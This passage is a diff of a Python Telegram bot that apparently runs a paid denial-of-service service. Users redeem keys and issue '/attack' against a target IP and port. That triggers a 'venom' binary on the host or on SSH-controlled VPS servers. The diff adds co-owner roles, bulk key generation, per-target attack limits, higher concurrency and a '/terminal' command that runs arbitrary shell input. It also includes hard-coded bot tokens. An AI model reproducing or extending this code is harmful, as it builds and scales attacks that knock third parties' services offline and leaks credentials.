@@ -27,6 +27,11 @@ except ImportError:
     import paramiko
 
 # ---------------------------
+# Record Bot Start Time for Uptime
+# ---------------------------
+start_time = datetime.now()
+
+# ---------------------------
 # Periodic Print Function
 # ---------------------------
 def print_periodically():
@@ -39,7 +44,6 @@ def print_periodically():
 # ---------------------------
 def execute_own_vps_command(target_ip, target_port, duration):
     try:
-        # Execute the binary on the current machine (your own VPS)
         command = f'nohup ./venom {target_ip} {target_port} {duration} 300 > /dev/null 2>&1 &'
         subprocess.Popen(command, shell=True)
         print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Executed on own VPS: {command}")
@@ -49,7 +53,7 @@ def execute_own_vps_command(target_ip, target_port, duration):
 # ---------------------------
 # Bot and Global Setup
 # ---------------------------
-BOT_TOKEN = '7715609619:AAHzD-H2qh6RLfkWiJLQxY6iKLC6_JnplyM'
+BOT_TOKEN = '7598762752:AAEg80AKf7_i86X9qn0H5VtOAgPpmtSd5eE'
 BOT_OWNER_ID = 5730843286  # Replace with your Telegram ID
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -59,6 +63,7 @@ VPS_FILE = "vps_servers.json"
 KEYS_FILE = "keys.json"
 USERS_FILE = "users.json"
 BLOCKED_USERS_FILE = "blocked_users.json"
+COOWNERS_FILE = "coowners.json"
 LOGS_FILE = "execution_logs.txt"
 ADMIN_CREDITS_FILE = "admin_credits.json"  # For advanced credit system
 
@@ -72,8 +77,35 @@ global_max_duration = 60         # default maximum attack duration (seconds)
 global_cooldown = 300            # default cooldown period (seconds) after an attack
 attack_cooldowns = {}            # mapping: target_ip -> cooldown expiry datetime
 
-# ThreadPoolExecutor for parallel tasks
-executor = ThreadPoolExecutor(max_workers=10)
+# New: Global IP attack limit and dictionary for counting attacks per IP.
+ip_attack_limit = 0
+ip_attack_counts = {}
+
+# ---------------------------
+# Load and Save Coowners
+# ---------------------------
+def load_coowners():
+    if os.path.exists(COOWNERS_FILE):
+        try:
+            with open(COOWNERS_FILE, 'r') as f:
+                return set(json.load(f))
+        except Exception as e:
+            log_execution(f"Error loading coowners: {e}")
+    return set()
+
+def save_coowners(coowners):
+    try:
+        with open(COOWNERS_FILE, 'w') as f:
+            json.dump(list(coowners), f)
+    except Exception as e:
+        log_execution(f"Error saving coowners: {e}")
+
+coowners = load_coowners()
+
+# ---------------------------
+# Increase ThreadPool for Concurrency
+# ---------------------------
+executor = ThreadPoolExecutor(max_workers=100)
 
 # ---------------------------
 # Safe Telegram API Helpers
@@ -139,7 +171,7 @@ admin_credits = load_json(ADMIN_CREDITS_FILE, {})
 
 if str(BOT_OWNER_ID) not in admin_credits:
     admin_credits[str(BOT_OWNER_ID)] = {
-        "balance": 1000000,  # 1,000,000 credits
+        "balance": 1000000,
         "history": [{
             "type": "add",
             "amount": 1000000,
@@ -240,62 +272,145 @@ def execute_command(vps, target_ip, target_port, duration):
             pass
 
 # ---------------------------
-# Inline Help Command with Keyboard
+# New: /setip Command (Owner Only)
+# ---------------------------
+@bot.message_handler(commands=['setip'])
+@safe_handler
+def set_ip_limit_handler(message):
+    if message.from_user.id != BOT_OWNER_ID:
+        safe_reply(message, "<b>🚫 Not authorized to set IP attack limit!</b>")
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        safe_reply(message, "<b>❓ Usage:</b> /setip <number>")
+        return
+    try:
+        limit = int(parts[1])
+    except Exception:
+        safe_reply(message, "<b>❌ Limit must be an integer.</b>")
+        return
+    global ip_attack_limit, ip_attack_counts
+    ip_attack_limit = limit
+    ip_attack_counts = {}
+    safe_reply(message, f"<b>✅ IP attack limit set to {limit} times per IP.</b>")
+
+# ---------------------------
+# Helper: Check if user is Owner (BOT_OWNER_ID) or Coowner
+# ---------------------------
+def is_owner(message):
+    return message.from_user.id == BOT_OWNER_ID or message.from_user.id in coowners
+
+# ---------------------------
+# /coowner Command (Owner Only)
+# Usage: /coowner add <user_id> OR /coowner remove <user_id> OR /coowner list
+# ---------------------------
+@bot.message_handler(commands=['coowner'])
+@safe_handler
+def coowner_handler(message):
+    if message.from_user.id != BOT_OWNER_ID:
+        safe_reply(message, "<b>🚫 Only the owner can manage coowners!</b>")
+        return
+    parts = message.text.split()
+    if len(parts) < 2:
+        safe_reply(message, "<b>❓ Usage:</b> /coowner add|remove|list [user_id]")
+        return
+    action = parts[1].lower()
+    global coowners
+    if action == "add":
+        if len(parts) != 3:
+            safe_reply(message, "<b>❓ Usage:</b> /coowner add <user_id>")
+            return
+        try:
+            user_id = int(parts[2])
+        except Exception:
+            safe_reply(message, "<b>❌ User ID must be an integer.</b>")
+            return
+        coowners.add(user_id)
+        save_coowners(coowners)
+        safe_reply(message, f"<b>✅ User {user_id} added as coowner.</b>")
+    elif action == "remove":
+        if len(parts) != 3:
+            safe_reply(message, "<b>❓ Usage:</b> /coowner remove <user_id>")
+            return
+        try:
+            user_id = int(parts[2])
+        except Exception:
+            safe_reply(message, "<b>❌ User ID must be an integer.</b>")
+            return
+        if user_id in coowners:
+            coowners.remove(user_id)
+            save_coowners(coowners)
+            safe_reply(message, f"<b>✅ User {user_id} removed from coowners.</b>")
+        else:
+            safe_reply(message, "<b>ℹ️ User is not a coowner.</b>")
+    elif action == "list":
+        if coowners:
+            reply = "<b>👥 Coowners:</b>\n"
+            for uid in coowners:
+                reply += f"<code>{uid}</code>\n"
+            safe_reply(message, reply)
+        else:
+            safe_reply(message, "<b>ℹ️ No coowners set.</b>")
+    else:
+        safe_reply(message, "<b>❓ Unknown action. Use add, remove, or list.</b>")
+
+# ---------------------------
+# Modified Help Command
 # ---------------------------
 @bot.message_handler(commands=['help'])
 @safe_handler
 def send_help(message):
-    # Only approved users (registered via /usekey or the owner) may use /help.
-    if message.from_user.id != BOT_OWNER_ID and str(message.from_user.id) not in users:
-        safe_reply(message, "<b>🚫 You are not an approved user. Please register using /usekey &lt;key&gt;.</b>")
-        return
-    if message.from_user.id in blocked_users:
-        safe_reply(message, "<b>🚫 You are blocked from using this bot!</b>")
-        return
-    keyboard = telebot.types.InlineKeyboardMarkup()
-    button_general = telebot.types.InlineKeyboardButton(text="💡 General Help", callback_data="help_general")
-    button_vps = telebot.types.InlineKeyboardButton(text="🖥️ VPS Management", callback_data="help_vps")
-    button_keys = telebot.types.InlineKeyboardButton(text="🔑 Key Management", callback_data="help_keys")
-    button_users = telebot.types.InlineKeyboardButton(text="👥 User Management", callback_data="help_users")
-    keyboard.row(button_general, button_vps)
-    keyboard.row(button_keys, button_users)
-    help_message = "<b>🤖 VPS Manager Bot Help</b>\nSelect a category for details:"
-    safe_send(message.chat.id, help_message, reply_markup=keyboard)
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("help_"))
-@safe_handler
-def callback_help(call):
-    bot.answer_callback_query(call.id, text="⏳ Loading help...")
-    if call.data == "help_general":
-        text = ("<b>💡 General Help</b>\n"
-                "• /start - Welcome message 🌟\n"
-                "• /help - This help menu 📚\n"
-                "• /cancel - Cancel ongoing commands (Owner only) 🛑")
-    elif call.data == "help_vps":
-        text = ("<b>🖥️ VPS Management</b>\n"
-                "• /addvps &lt;ip&gt; &lt;username&gt; &lt;password&gt; - Add a VPS (Owner only) ➕\n"
-                "• /listvps - List all VPS (Owner only) 📋\n"
-                "• /removevps &lt;ip&gt; - Remove a VPS (Owner only) ➖\n"
-                "• /updatevps &lt;ip&gt; &lt;new_username&gt; &lt;new_password&gt; - Update a VPS (Owner only) 🔄\n"
-                "• /status - Check VPS status (Owner only) 🔍")
-    elif call.data == "help_keys":
-        text = ("<b>🔑 Key Management</b>\n"
-                "• /genkey &lt;validity&gt; &lt;max_users&gt; &lt;max_duration&gt; &lt;prefix&gt; - Generate a key (Owner only) ✨\n"
-                "   Example: /genkey 1day 10user 60duration MYKEY\n"
-                "• /usekey &lt;key&gt; - Register a key 📝\n"
-                "• /keyinfo - View key info ℹ️\n"
-                "• /revoke &lt;key&gt; - Revoke a key (Owner only) ❌\n"
-                "• /listkeys - List all keys (Owner only) 📜\n"
-                "• /keyadmin - See which admin generated which key")
-    elif call.data == "help_users":
-        text = ("<b>👥 User Management</b>\n"
-                "• /blockuser &lt;user_id&gt; - Block a user (Owner only) 🚫\n"
-                "• /unblockuser &lt;user_id&gt; - Unblock a user (Owner only) ✅\n"
-                "• /activeusers - List all active users")
+    if is_owner(message):
+        help_text = "<b>🤖 Owner/Coowner Help</b>\n\n"
+        help_text += "<b>General Commands:</b>\n"
+        help_text += "/start - Welcome message\n"
+        help_text += "/help - Show this help\n"
+        help_text += "/uptime - Check bot uptime\n\n"
+        help_text += "<b>Key Management:</b>\n"
+        help_text += "/genkey <validity> <max_users> <max_duration> <prefix> - Generate multiple keys (one per user)\n"
+        help_text += "/usekey <key> - Register a key\n"
+        help_text += "/keyinfo - View your key info\n"
+        help_text += "/revoke <key> - Revoke a key\n"
+        help_text += "/listkeys - List all keys\n"
+        help_text += "/keyadmin - Key admin info\n\n"
+        help_text += "<b>VPS Management:</b>\n"
+        help_text += "/addvps <ip> <username> <password> - Add a VPS\n"
+        help_text += "/listvps - List VPS\n"
+        help_text += "/removevps <ip> - Remove a VPS\n"
+        help_text += "/updatevps <ip> <new_username> <new_password> - Update a VPS\n"
+        help_text += "/status - Check VPS status\n"
+        help_text += "/logs - Show logs\n\n"
+        help_text += "<b>Attack Commands:</b>\n"
+        help_text += "/attack <target_ip> <target_port> <time> - Launch an attack\n"
+        help_text += "/setip <number> - Set max attacks allowed per target IP\n\n"
+        help_text += "<b>User Management:</b>\n"
+        help_text += "/blockuser <user_id> - Block a user\n"
+        help_text += "/unblockuser <user_id> - Unblock a user\n"
+        help_text += "/activeusers - List active users\n\n"
+        help_text += "<b>Admin Commands:</b>\n"
+        help_text += "/setduration <seconds> - Set global max duration\n"
+        help_text += "/setcooldown <seconds> - Set global cooldown\n"
+        help_text += "/cancel - Cancel execution\n"
+        help_text += "/admin - Open admin panel\n"
+        help_text += "/checkcredits - Check credit balance\n"
+        help_text += "/addcredit <admin_id> <amount> - Add credits\n"
+        help_text += "/addadmin <admin_id> [initial_credit] - Add an admin\n"
+        help_text += "/removeadmin <admin_id> - Remove an admin\n"
+        help_text += "/terminal <command> - Execute a shell command\n"
+        help_text += "/coowner add|remove|list <user_id> (Owner only)\n"
+        safe_reply(message, help_text)
     else:
-        text = "<b>❓ No help available.</b>"
-    chat_id = call.message.chat.id if call.message else call.from_user.id
-    safe_send(chat_id, text)
+        help_text = "<b>🤖 User Help</b>\n\n"
+        help_text += "<b>General Commands:</b>\n"
+        help_text += "/start - Welcome message\n"
+        help_text += "/help - Show this help\n"
+        help_text += "/uptime - Check bot uptime\n\n"
+        help_text += "<b>Key Management:</b>\n"
+        help_text += "/usekey <key> - Register a key\n"
+        help_text += "/keyinfo - View your key info\n\n"
+        help_text += "<b>Attack Commands:</b>\n"
+        help_text += "/attack <target_ip> <target_port> <time> - Launch an attack\n"
+        safe_reply(message, help_text)
 
 # ---------------------------
 # Other Command Handlers
@@ -306,29 +421,28 @@ def send_welcome(message):
     if message.from_user.id in blocked_users:
         safe_reply(message, "<b>🚫 You are blocked from using this bot!</b>")
         return
-    welcome_text = (
-        "<b>👋 Welcome to the VPS Manager Bot!</b>\n\n"
-        "Use /help to view commands 📚.\n"
-        "Commands include:\n"
-        "• /genkey, /usekey, /attack 🚀\n"
-        "• /addvps, /listvps, /removevps, /updatevps, /status 🖥️\n"
-        "• /logs, /revoke, /listkeys, /keyinfo, /keyadmin 📜\n"
-        "• /blockuser, /unblockuser, /activeusers, /cancel 🛑\n"
-        "• /admin, /checkcredits, /addcredit, /addadmin, /removeadmin 💳\n"
-        "• /setduration, /setcooldown (Owner only)\n"
-        "• /attack will execute using your own VPS if no external VPS is available."
-    )
+    welcome_text = "<b>👋 Welcome to the VPS Manager Bot!</b>\nPlease use /help to view available commands."
     safe_reply(message, welcome_text)
 
+@bot.message_handler(commands=['uptime'])
+@safe_handler
+def uptime_handler(message):
+    uptime_duration = datetime.now() - start_time
+    uptime_str = str(uptime_duration).split('.')[0]
+    safe_reply(message, f"<b>🤖 Uptime:</b> {uptime_str}")
+
+# ---------------------------
+# Modified /genkey Command (Owner Only)
+# ---------------------------
 @bot.message_handler(commands=['genkey'])
 @safe_handler
 def generate_key(message):
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to generate keys!</b>")
         return
     command_parts = message.text.split()
     if len(command_parts) != 5:
-        safe_reply(message, "<b>❓ Usage:</b> /genkey &lt;validity&gt; &lt;max_users&gt; &lt;max_duration&gt; &lt;prefix&gt;")
+        safe_reply(message, "<b>❓ Usage:</b> /genkey <validity> <max_users> <max_duration> <prefix>")
         return
     validity_arg, max_users_arg, max_duration_arg, prefix_arg = command_parts[1:5]
     validity_lower = validity_arg.lower()
@@ -345,26 +459,30 @@ def generate_key(message):
         safe_reply(message, "<b>❌ Invalid validity format.</b>")
         return
     try:
-        max_users = int(''.join(filter(str.isdigit, max_users_arg)))
+        num_keys = int(''.join(filter(str.isdigit, max_users_arg)))
         max_duration = int(''.join(filter(str.isdigit, max_duration_arg)))
     except Exception:
         safe_reply(message, "<b>❌ Error parsing max_users or max_duration.</b>")
         return
     prefix = prefix_arg if prefix_arg.endswith('-') else prefix_arg + '-'
-    suffix = uuid.uuid4().hex[:6].upper()
-    new_key = prefix + suffix
-    keys[new_key] = {
-        "expires_at": expiration.isoformat(),
-        "max_users": max_users,
-        "max_duration": max_duration,
-        "used": [],
-        "generated_by": message.from_user.id
-    }
+    generated_keys = []
+    for _ in range(num_keys):
+        suffix = uuid.uuid4().hex[:6].upper()
+        new_key = prefix + suffix
+        keys[new_key] = {
+            "expires_at": expiration.isoformat(),
+            "max_users": 1,
+            "max_duration": max_duration,
+            "used": [],
+            "generated_by": message.from_user.id
+        }
+        generated_keys.append(new_key)
     save_keys_data()
-    reply = (f"<b>✅ Key generated:</b> <code>{new_key}</code>\n"
-             f"<b>Expires at:</b> {expiration}\n"
-             f"<b>Max Users:</b> {max_users}\n"
-             f"<b>Max Duration:</b> {max_duration} seconds")
+    reply = "<b>✅ Keys generated:</b>\n"
+    for k in generated_keys:
+        reply += f"<code>{k}</code>\n"
+    reply += f"<b>Expires at:</b> {expiration}\n"
+    reply += f"<b>Max Duration:</b> {max_duration} seconds"
     safe_reply(message, reply)
 
 @bot.message_handler(commands=['usekey'])
@@ -372,7 +490,7 @@ def generate_key(message):
 def use_key_handler(message):
     command_parts = message.text.split()
     if len(command_parts) != 2:
-        safe_reply(message, "<b>❓ Usage:</b> /usekey &lt;key&gt;")
+        safe_reply(message, "<b>❓ Usage:</b> /usekey <key>")
         return
     provided_key = command_parts[1].strip()
     if provided_key not in keys:
@@ -384,7 +502,7 @@ def use_key_handler(message):
         safe_reply(message, "<b>⏰ Key expired!</b>")
         return
     if len(key_data["used"]) >= key_data["max_users"]:
-        safe_reply(message, "<b>⚠️ Key has reached max users!</b>")
+        safe_reply(message, "<b>⚠️ Key has already been used!</b>")
         return
     user_id_str = str(message.from_user.id)
     if user_id_str in key_data["used"]:
@@ -396,18 +514,15 @@ def use_key_handler(message):
     save_users_data()
     safe_reply(message, f"<b>✅ Key accepted!</b> You can attack for {key_data['max_duration']} seconds.")
 
-# ---------------------------
-# New Owner-only Commands: /setduration and /setcooldown
-# ---------------------------
 @bot.message_handler(commands=['setduration'])
 @safe_handler
 def set_duration_handler(message):
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to set max duration!</b>")
         return
     parts = message.text.split()
     if len(parts) != 2:
-        safe_reply(message, "<b>❓ Usage:</b> /setduration &lt;seconds&gt;")
+        safe_reply(message, "<b>❓ Usage:</b> /setduration <seconds>")
         return
     try:
         duration = int(parts[1])
@@ -421,12 +536,12 @@ def set_duration_handler(message):
 @bot.message_handler(commands=['setcooldown'])
 @safe_handler
 def set_cooldown_handler(message):
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to set cooldown!</b>")
         return
     parts = message.text.split()
     if len(parts) != 2:
-        safe_reply(message, "<b>❓ Usage:</b> /setcooldown &lt;seconds&gt;")
+        safe_reply(message, "<b>❓ Usage:</b> /setcooldown <seconds>")
         return
     try:
         cooldown = int(parts[1])
@@ -437,15 +552,12 @@ def set_cooldown_handler(message):
     global_cooldown = cooldown
     safe_reply(message, f"<b>✅ Global cooldown set to:</b> {cooldown} seconds")
 
-# ---------------------------
-# Modified /attack Command with Global Duration and Cooldown Checks
-# ---------------------------
 @bot.message_handler(commands=['attack'])
 @safe_handler
 def attack_vps(message):
     user_id_str = str(message.from_user.id)
     if user_id_str not in users:
-        safe_reply(message, "<b>🚫 Not authorized.</b> Register using /usekey &lt;key&gt;.")
+        safe_reply(message, "<b>🚫 Not authorized.</b> Register using /usekey <key>.")
         return
     user_key = users[user_id_str]
     if user_key not in keys:
@@ -458,7 +570,7 @@ def attack_vps(message):
         return
     command_parts = message.text.split()
     if len(command_parts) != 4:
-        safe_reply(message, "<b>❓ Usage:</b> /attack &lt;target_ip&gt; &lt;target_port&gt; &lt;time&gt;")
+        safe_reply(message, "<b>❓ Usage:</b> /attack <target_ip> <target_port> <time>")
         return
     ip = command_parts[1]
     port = command_parts[2]
@@ -470,33 +582,37 @@ def attack_vps(message):
     if duration > global_max_duration:
         safe_reply(message, f"<b>⚠️ Duration exceeds global max duration of {global_max_duration} seconds.</b>")
         return
-    now = datetime.now()
-    if ip in attack_cooldowns and now < attack_cooldowns[ip]:
-        safe_reply(message, f"<b>🚫 This IP is on cooldown until {attack_cooldowns[ip].strftime('%Y-%m-%d %H:%M:%S')}.</b>")
-        return
+    # Check IP attack limit if set
+    if ip_attack_limit and ip_attack_limit > 0:
+        count = ip_attack_counts.get(ip, 0)
+        if count >= ip_attack_limit:
+            safe_reply(message, f"<b>🚫 This IP has reached its attack limit of {ip_attack_limit} times.</b>")
+            return
+        else:
+            ip_attack_counts[ip] = count + 1
     if duration > key_data["max_duration"]:
         safe_reply(message, f"<b>⚠️ Duration exceeds your key's max duration of {key_data['max_duration']} seconds.</b>")
         return
-    # If no external VPS is available, execute the binary on your own VPS
+    # Notify owner about the attack initiation
+    owner_message = (f"Attack initiated by User ID: <code>{message.from_user.id}</code>\n"
+                     f"Target: <code>{ip}:{port}</code>\n"
+                     f"Duration: {duration} seconds")
+    safe_send(BOT_OWNER_ID, owner_message)
+    # Execute attack using executor for high concurrency
     if not vps_servers:
         safe_reply(message, "<b>ℹ️ No external VPS available. Executing on your own VPS.</b>")
-        threading.Thread(target=execute_own_vps_command, args=(ip, port, duration), daemon=True).start()
+        executor.submit(execute_own_vps_command, ip, port, duration)
     else:
         cancel_event.clear()
         safe_reply(message, f"<b>🔥 Attack Initiated!</b>\nTarget: <code>{ip}:{port}</code>\nDuration: {duration} seconds\nVPS Count: {len(vps_servers)}")
-        attack_cooldowns[ip] = now + timedelta(seconds=global_cooldown)
+        attack_cooldowns[ip] = datetime.now() + timedelta(seconds=global_cooldown)
         for vps in vps_servers:
-            thread = threading.Thread(target=execute_command, args=(vps, ip, port, duration), daemon=True)
-            thread.start()
+            executor.submit(execute_command, vps, ip, port, duration)
 
-# ---------------------------
-# New Command: List Active Users
-# ---------------------------
 @bot.message_handler(commands=['activeusers'])
 @safe_handler
 def active_users_handler(message):
-    # Only allow the owner to view active users
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to view active users!</b>")
         return
     if not users:
@@ -507,14 +623,10 @@ def active_users_handler(message):
         reply += f"User ID: <code>{user_id}</code> | Key: <code>{key}</code>\n"
     safe_reply(message, reply)
 
-# ---------------------------
-# New Command: List Keys with Admin Info
-# ---------------------------
 @bot.message_handler(commands=['keyadmin'])
 @safe_handler
 def key_admin_handler(message):
-    # Only allow the owner to view which admin generated keys
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to view key admin info!</b>")
         return
     if not keys:
@@ -526,18 +638,15 @@ def key_admin_handler(message):
         reply += f"Key: <code>{key_val}</code> | Generated by Admin ID: <code>{gen_by}</code>\n"
     safe_reply(message, reply)
 
-# ---------------------------
-# VPS Management Commands
-# ---------------------------
 @bot.message_handler(commands=['addvps'])
 @safe_handler
 def add_vps_handler(message):
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to add VPS!</b>")
         return
     command_parts = message.text.split()
     if len(command_parts) != 4:
-        safe_reply(message, "<b>❓ Usage:</b> /addvps &lt;ip&gt; &lt;username&gt; &lt;password&gt;")
+        safe_reply(message, "<b>❓ Usage:</b> /addvps <ip> <username> <password>")
         return
     ip, username, password = command_parts[1:4]
     new_vps = {'ip': ip, 'username': username, 'password': password}
@@ -548,7 +657,7 @@ def add_vps_handler(message):
 @bot.message_handler(commands=['listvps'])
 @safe_handler
 def list_vps_handler(message):
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to view VPS list!</b>")
         return
     if not vps_servers:
@@ -562,12 +671,12 @@ def list_vps_handler(message):
 @bot.message_handler(commands=['removevps'])
 @safe_handler
 def remove_vps_handler(message):
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to remove VPS!</b>")
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
-        safe_reply(message, "<b>❓ Usage:</b> /removevps &lt;ip&gt;")
+        safe_reply(message, "<b>❓ Usage:</b> /removevps <ip>")
         return
     ip_to_remove = command_parts[1]
     removed = False
@@ -585,12 +694,12 @@ def remove_vps_handler(message):
 @bot.message_handler(commands=['updatevps'])
 @safe_handler
 def update_vps_handler(message):
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to update VPS!</b>")
         return
     command_parts = message.text.split()
     if len(command_parts) != 4:
-        safe_reply(message, "<b>❓ Usage:</b> /updatevps &lt;ip&gt; &lt;new_username&gt; &lt;new_password&gt;")
+        safe_reply(message, "<b>❓ Usage:</b> /updatevps <ip> <new_username> <new_password>")
         return
     ip, new_username, new_password = command_parts[1:4]
     updated = False
@@ -609,7 +718,7 @@ def update_vps_handler(message):
 @bot.message_handler(commands=['status'])
 @safe_handler
 def status_vps_handler(message):
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to check VPS status!</b>")
         return
     status_report = ""
@@ -627,7 +736,7 @@ def status_vps_handler(message):
 @bot.message_handler(commands=['logs'])
 @safe_handler
 def show_logs_handler(message):
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to view logs!</b>")
         return
     if os.path.exists(LOGS_FILE):
@@ -640,18 +749,15 @@ def show_logs_handler(message):
     else:
         safe_reply(message, "<b>ℹ️ No logs available.</b>")
 
-# ---------------------------
-# Key Management Commands
-# ---------------------------
 @bot.message_handler(commands=['revoke'])
 @safe_handler
 def revoke_key_handler(message):
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to revoke keys!</b>")
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
-        safe_reply(message, "<b>❓ Usage:</b> /revoke &lt;key&gt;")
+        safe_reply(message, "<b>❓ Usage:</b> /revoke <key>")
         return
     key_to_revoke = command_parts[1].strip()
     if key_to_revoke in keys:
@@ -664,7 +770,7 @@ def revoke_key_handler(message):
 @bot.message_handler(commands=['listkeys'])
 @safe_handler
 def list_keys_handler(message):
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to list keys!</b>")
         return
     if not keys:
@@ -673,7 +779,7 @@ def list_keys_handler(message):
     reply = "<b>🔑 Generated Keys:</b>\n"
     for key_val, details in keys.items():
         reply += (f"Key: <code>{key_val}</code>, Expires: {details['expires_at']}, "
-                  f"Max Users: {details['max_users']}, Max Duration: {details['max_duration']} sec\n")
+                  f"Max Duration: {details['max_duration']} sec\n")
     safe_reply(message, reply)
 
 @bot.message_handler(commands=['keyinfo'])
@@ -681,32 +787,28 @@ def list_keys_handler(message):
 def key_info_handler(message):
     user_id_str = str(message.from_user.id)
     if user_id_str not in users:
-        safe_reply(message, "<b>ℹ️ You have not registered a key.</b> Use /usekey &lt;key&gt;.")
+        safe_reply(message, "<b>ℹ️ You have not registered a key.</b> Use /usekey <key>.")
         return
     user_key = users[user_id_str]
     if user_key not in keys:
-        safe_reply(message, "<b>❌ Your key is invalid.</b> Register again using /usekey &lt;key&gt;.")
+        safe_reply(message, "<b>❌ Your key is invalid.</b> Register again using /usekey <key>.")
         return
     details = keys[user_key]
     info_text = (f"<b>🔑 Key:</b> <code>{user_key}</code>\n"
                  f"<b>Expires at:</b> {details['expires_at']}\n"
-                 f"<b>Max Users:</b> {details['max_users']}\n"
                  f"<b>Max Duration:</b> {details['max_duration']} seconds\n"
                  f"<b>Users registered:</b> {len(details['used'])}")
     safe_reply(message, info_text)
 
-# ---------------------------
-# User Blocking Commands
-# ---------------------------
 @bot.message_handler(commands=['blockuser'])
 @safe_handler
 def block_user_handler(message):
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to block users!</b>")
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
-        safe_reply(message, "<b>❓ Usage:</b> /blockuser &lt;user_id&gt;")
+        safe_reply(message, "<b>❓ Usage:</b> /blockuser <user_id>")
         return
     try:
         user_to_block = int(command_parts[1])
@@ -723,12 +825,12 @@ def block_user_handler(message):
 @bot.message_handler(commands=['unblockuser'])
 @safe_handler
 def unblock_user_handler(message):
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to unblock users!</b>")
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
-        safe_reply(message, "<b>❓ Usage:</b> /unblockuser &lt;user_id&gt;")
+        safe_reply(message, "<b>❓ Usage:</b> /unblockuser <user_id>")
         return
     try:
         user_to_unblock = int(command_parts[1])
@@ -742,13 +844,10 @@ def unblock_user_handler(message):
     else:
         safe_reply(message, "<b>ℹ️ User is not blocked.</b>")
 
-# ---------------------------
-# Cancel Execution Command
-# ---------------------------
 @bot.message_handler(commands=['cancel'])
 @safe_handler
 def cancel_execution_handler(message):
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to cancel execution!</b>")
         return
     cancel_event.set()
@@ -762,14 +861,34 @@ def cancel_execution_handler(message):
     cancel_event.clear()
 
 # ---------------------------
-# Admin Panel & Key Management (Owner-only)
+# Terminal Command (Owner Only)
 # ---------------------------
+@bot.message_handler(commands=['terminal'])
+@safe_handler
+def terminal_handler(message):
+    if not is_owner(message):
+        safe_reply(message, "<b>🚫 Not authorized to use terminal!</b>")
+        return
+    command_text = message.text.partition(" ")[2]
+    if not command_text:
+        safe_reply(message, "<b>❓ Usage:</b> /terminal <command>")
+        return
+    try:
+        result = subprocess.check_output(command_text, shell=True, stderr=subprocess.STDOUT, timeout=15)
+        result_text = result.decode('utf-8', errors='replace')
+    except subprocess.CalledProcessError as e:
+        result_text = f"❌ Command failed:\n{e.output.decode('utf-8', errors='replace')}"
+    except Exception as e:
+        result_text = f"❌ Error: {str(e)}"
+    if len(result_text) > 4000:
+        result_text = result_text[:4000] + "\n...Output truncated."
+    safe_reply(message, f"<b>Terminal Output:</b>\n<pre>{result_text}</pre>")
+
 @bot.message_handler(commands=['admin'])
 @safe_handler
 def admin_panel_handler(message):
-    admin_id = message.from_user.id
-    if admin_id != BOT_OWNER_ID and get_credit_balance(admin_id) < 1:
-        safe_reply(message, "<b>🚫 You do not have sufficient credits for admin panel!</b>")
+    if not is_owner(message):
+        safe_reply(message, "<b>🚫 Not authorized to access admin panel!</b>")
         return
     keyboard = telebot.types.InlineKeyboardMarkup()
     button_genkey = telebot.types.InlineKeyboardButton(text="✨ Generate Key", callback_data="admin_genkey")
@@ -797,7 +916,7 @@ def admin_callback(call):
             reply = "<b>🔑 Generated Keys:</b>\n"
             for key_val, details in keys.items():
                 reply += (f"Key: <code>{key_val}</code>, Expires: {details['expires_at']}, "
-                          f"Max Users: {details['max_users']}, Max Duration: {details['max_duration']} sec\n")
+                          f"Max Duration: {details['max_duration']} sec\n")
             safe_send(chat_id, reply)
     elif call.data == "admin_revoke":
         bot.answer_callback_query(call.id, text="⏳ Awaiting key to revoke...")
@@ -829,36 +948,30 @@ def admin_generate_key_step(message):
         safe_reply(message, "<b>❌ Invalid validity format.</b> Use 'day' or 'min'.")
         return
     try:
-        max_users = int(''.join(filter(str.isdigit, max_users_arg)))
+        num_keys = int(''.join(filter(str.isdigit, max_users_arg)))
         max_duration = int(''.join(filter(str.isdigit, max_duration_arg)))
     except Exception:
         safe_reply(message, "<b>❌ Error parsing max_users or max_duration.</b>")
         return
-    users_cost = max_users
-    duration_cost = (max_duration + 29) // 30
-    total_cost = validity_cost + users_cost + duration_cost
-    current_credits = get_credit_balance(admin_id)
-    if current_credits < total_cost:
-        safe_reply(message, f"<b>🚫 Insufficient credits.</b> Cost is {total_cost}, you have {current_credits}.")
-        return
     prefix = prefix_arg if prefix_arg.endswith('-') else prefix_arg + '-'
-    suffix = uuid.uuid4().hex[:6].upper()
-    new_key = prefix + suffix
-    keys[new_key] = {
-        "expires_at": expiration.isoformat(),
-        "max_users": max_users,
-        "max_duration": max_duration,
